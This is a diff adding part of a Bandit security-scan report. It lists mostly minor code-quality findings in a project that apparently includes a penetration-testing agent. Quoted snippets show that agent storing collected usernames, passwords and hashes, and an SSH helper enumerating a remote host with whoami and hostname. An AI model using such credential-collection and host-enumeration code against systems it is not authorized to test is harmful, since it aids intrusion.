+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 620,
+      "line_range": [
+        620,
+        621
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "666             lifecycle.register_draft(name, path)\n667         except Exception:\n668             continue\n669 \n",
+      "col_offset": 8,
+      "end_col_offset": 20,
+      "filename": "app\\services\\pentest_agent\\reflection.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Continue detected.",
+      "line_number": 667,
+      "line_range": [
+        667,
+        668
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b112_try_except_continue.html",
+      "test_id": "B112",
+      "test_name": "try_except_continue"
+    },
+    {
+      "code": "291 \n292     def add_credential(\n293         self,\n294         username: str,\n295         password: str = \"\",\n296         hash_val: str = \"\",\n297         source: str = \"\",\n298         kind: str = \"\",\n299         confidence: str = \"normal\",\n300     ):\n301         normalized_confidence = str(confidence or \"normal\").strip().lower() or \"normal\"\n302         cred = {\n303             \"username\": str(username or \"\").strip(),\n304             \"password\": str(password or \"\").strip(),\n305             \"hash\": str(hash_val or \"\").strip(),\n306             \"source\": str(source or \"\").strip(),\n307             \"kind\": str(kind or \"\").strip(),\n308             \"confidence\": normalized_confidence,\n309         }\n310 \n311         def _confidence_rank(value: str) -> int:\n312             ranks = {\"low\": 0, \"normal\": 1, \"high\": 2}\n313             return ranks.get(str(value or \"normal\").strip().lower(), 1)\n314 \n315         with self._lock:\n316             for idx, existing in enumerate(self.data[\"credentials\"]):\n317                 if not isinstance(existing, dict):\n318                     continue\n319                 same_core = all(\n320                     str(existing.get(key, \"\")).strip() == cred[key]\n321                     for key in (\"username\", \"password\", \"hash\", \"source\", \"kind\")\n322                 )\n323                 if not same_core:\n324                     continue\n325                 merged = dict(existing)\n326                 if _confidence_rank(cred[\"confidence\"]) >= _confidence_rank(existing.get(\"confidence\", \"normal\")):\n327                     merged[\"confidence\"] = cred[\"confidence\"]\n328                 self.data[\"credentials\"][idx] = merged\n329                 self.save()\n330                 return\n331             self.data[\"credentials\"].append(cred)\n332             self.save()\n333 \n",
+      "col_offset": 4,
+      "end_col_offset": 23,
+      "filename": "app\\services\\pentest_agent\\state.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: ''",
+      "line_number": 292,
+      "line_range": [
+        292,
+        293,
+        294,
+        295,
+        296,
+        297,
+        298,
+        299,
+        300,
+        301,
+        302,
+        303,
+        304,
+        305,
+        306,
+        307,
+        308,
+        309,
+        310,
+        311,
+        312,
+        313,
+        314,
+        315,
+        316,
+        317,
+        318,
+        319,
+        320,
+        321,
+        322,
+        323,
+        324,
+        325,
+        326,
+        327,
+        328,
+        329,
+        330,
+        331,
+        332
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b107_hardcoded_password_default.html",
+      "test_id": "B107",
+      "test_name": "hardcoded_password_default"
+    },
+    {
+      "code": "2685                 f.write(md_report)\n2686         except Exception:\n2687             pass  # \u7ed3\u6784\u5316\u62a5\u544a\u751f\u6210\u5931\u8d25\u4e0d\u5f71\u54cd\u4e3b\u62a5\u544a\n2688 \n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\pentest_agent\\state.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 2686,
+      "line_range": [
+        2686,
+        2687
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "20 \n21 SRC = \"/tmp/anthropic-cyber/Anthropic-Cybersecurity-Skills-1.2.0/skills\"\n22 DST = \"/home/tqc/new-lovely4.23/new-lovely/skills/imported\"\n",
+      "col_offset": 6,
+      "end_col_offset": 72,
+      "filename": "app\\services\\skill_engine\\import_anthropic_skills.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 377,
+        "link": "https://cwe.mitre.org/data/definitions/377.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Probable insecure usage of temp file/directory.",
+      "line_number": 21,
+      "line_range": [
+        21
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b108_hardcoded_tmp_directory.html",
+      "test_id": "B108",
+      "test_name": "hardcoded_tmp_directory"
+    },
+    {
+      "code": "69                     subdomain_stats[sd] = subdomain_stats.get(sd, 0) + 1\n70                 except:\n71                     pass\n72 \n",
+      "col_offset": 16,
+      "end_col_offset": 24,
+      "filename": "app\\services\\skill_engine\\import_anthropic_skills.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 70,
+      "line_range": [
+        70,
+        71
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "287                     out.append((name, normalized))\n288             except Exception:\n289                 continue\n290         return out\n",
+      "col_offset": 12,
+      "end_col_offset": 24,
+      "filename": "app\\services\\skill_engine\\quality_gate.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Continue detected.",
+      "line_number": 288,
+      "line_range": [
+        288,
+        289
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b112_try_except_continue.html",
+      "test_id": "B112",
+      "test_name": "try_except_continue"
+    },
+    {
+      "code": "794                     continue\n795                 except Exception:\n796                     continue\n797 \n",
+      "col_offset": 16,
+      "end_col_offset": 28,
+      "filename": "app\\services\\skill_engine\\skill_generator.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Continue detected.",
+      "line_number": 795,
+      "line_range": [
+        795,
+        796
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b112_try_except_continue.html",
+      "test_id": "B112",
+      "test_name": "try_except_continue"
+    },
+    {
+      "code": "300                         candidates.sort(key=lambda x: -x.score)\n301                     except Exception:\n302                         pass\n303 \n",
+      "col_offset": 20,
+      "end_col_offset": 28,
+      "filename": "app\\services\\skill_engine\\skill_matcher.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 301,
+      "line_range": [
+        301,
+        302
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "341                 tfidf_ranks.setdefault(vr.skill.name, rank)\n342         except Exception:\n343             pass\n344 \n",
+      "col_offset": 8,
+      "end_col_offset": 16,
+      "filename": "app\\services\\skill_engine\\skill_matcher.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 342,
+      "line_range": [
+        342,
+        343
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "352                     emb_ranks.setdefault(em.skill.name, rank)\n353             except Exception:\n354                 pass\n355 \n",
+      "col_offset": 12,
+      "end_col_offset": 20,
+      "filename": "app\\services\\skill_engine\\skill_matcher.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 353,
+      "line_range": [
+        353,
+        354
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "588                         return terminal_id\n589                 except Exception:\n590                     pass\n591                 self._terminal_sessions.pop(terminal_id, None)\n",
+      "col_offset": 16,
+      "end_col_offset": 24,
+      "filename": "app\\services\\ssh_manager.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 589,
+      "line_range": [
+        589,
+        590
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "615                 session[\"channel\"].close()\n616             except Exception:\n617                 pass\n618     async def close_all_terminal_sessions(self) -> None:\n",
+      "col_offset": 12,
+      "end_col_offset": 20,
+      "filename": "app\\services\\ssh_manager.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 616,
+      "line_range": [
+        616,
+        617
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "673             \"ps1\": \"echo \\\"$PS1\\\" 2>/dev/null || echo '$ '\",\n674             \"pwd\": \"pwd\",\n675             \"home\": \"echo $HOME\",\n676             \"user\": \"whoami\",\n677             \"hostname\": \"hostname\",\n678             \"path\": \"echo $PATH\",\n679         }\n680         out: Dict[str, str] = {}\n681         for k, cmd in cmds.items():\n682             try:\n683                 r = await self.execute_command(cmd)\n684                 out[k] = (r.output or \"\").strip()\n",
+      "col_offset": 12,
+      "end_col_offset": 17,
+      "filename": "app\\services\\ssh_manager.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 259,
+        "link": "https://cwe.mitre.org/data/definitions/259.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Possible hardcoded password: 'pwd'",
+      "line_number": 674,
+      "line_range": [
+        670,
+        671,
+        672,
+        673,
+        674,
+        675,
+        676,
+        677,
+        678,
+        679
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b105_hardcoded_password_string.html",
+      "test_id": "B105",
+      "test_name": "hardcoded_password_string"
+    },
+    {
+      "code": "762                             completions.append(f)\n763             except Exception:\n764                 pass\n765         return CommandCompletion(completions=completions, prefix=input_text)\n",
+      "col_offset": 12,
+      "end_col_offset": 20,
+      "filename": "app\\services\\ssh_manager.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 763,
+      "line_range": [
+        763,
+        764
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "2 import platform\n3 import subprocess\n4 from typing import List\n",
+      "col_offset": 0,
+      "end_col_offset": 17,
+      "filename": "app\\utils\\system_fonts.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Consider possible security implications associated with the subprocess module.",
+      "line_number": 3,
+      "line_range": [
+        3
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_imports.html#b404-import-subprocess",
+      "test_id": "B404",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "48     try:\n49         result = subprocess.run(\n50             [\"reg\", \"query\", \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Fonts\"],\n51             capture_output=True, text=True, timeout=10,\n52         )\n53         if result.returncode == 0:\n",
+      "col_offset": 17,
+      "end_col_offset": 9,
+      "filename": "app\\utils\\system_fonts.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Starting a process with a partial executable path",
+      "line_number": 49,
+      "line_range": [
+        49,
+        50,
+        51,
+        52
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b607_start_process_with_partial_path.html",
+      "test_id": "B607",
+      "test_name": "start_process_with_partial_path"
+    },
+    {
+      "code": "48     try:\n49         result = subprocess.run(\n50             [\"reg\", \"query\", \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Fonts\"],\n51             capture_output=True, text=True, timeout=10,\n52         )\n53         if result.returncode == 0:\n",
+      "col_offset": 17,
+      "end_col_offset": 9,
+      "filename": "app\\utils\\system_fonts.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "subprocess call - check for execution of untrusted input.",
+      "line_number": 49,
+      "line_range": [
+        49,
+        50,
+        51,
+        52
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b603_subprocess_without_shell_equals_true.html",
+      "test_id": "B603",
+      "test_name": "subprocess_without_shell_equals_true"
+    },
+    {
+      "code": "69             return fonts\n70     except Exception:\n71         pass\n72     return []\n",
+      "col_offset": 4,
+      "end_col_offset": 12,
+      "filename": "app\\utils\\system_fonts.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 70,
+      "line_range": [
+        70,
+        71
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.9.4/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    }
+  ]
+}
